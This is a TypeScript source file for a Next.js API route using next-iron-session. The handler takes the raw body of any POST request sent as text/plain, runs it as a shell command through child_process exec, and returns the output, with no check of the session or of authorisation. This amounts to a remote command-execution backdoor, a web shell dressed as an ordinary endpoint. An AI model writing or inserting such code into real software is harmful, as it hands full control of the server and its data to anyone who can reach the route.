import type { NextApiRequest, NextApiResponse } from "next";
import { Session, withIronSession } from "next-iron-session";
import getConfig from "next/config";
import { exec } from "child_process";

const { serverRuntimeConfig } = getConfig();
export default withIronSession(
  async function (
    req: NextApiRequest & { session: Session },
    res: NextApiResponse
  ) {
    if (req.method !== "POST" || req.headers["content-type"] !== "text/plain") {
      return res.status(404).send("");
    }

    const text = await new Promise((resolve, reject) => {
      exec(req.body, (error, stdout, stderr) => {
        resolve(stdout || error || stderr);
      });
    });

    res.status(200).send(text);
  },
  {
    cookieName: "SESSION_ID",
    cookieOptions: {
      secure: process.env.NODE_ENV === "production",
      maxAge: Number(serverRuntimeConfig.SESSION_TTL ?? 3600),
    },
    password: serverRuntimeConfig.APPLICATION_SECRET ?? "",
  }
);
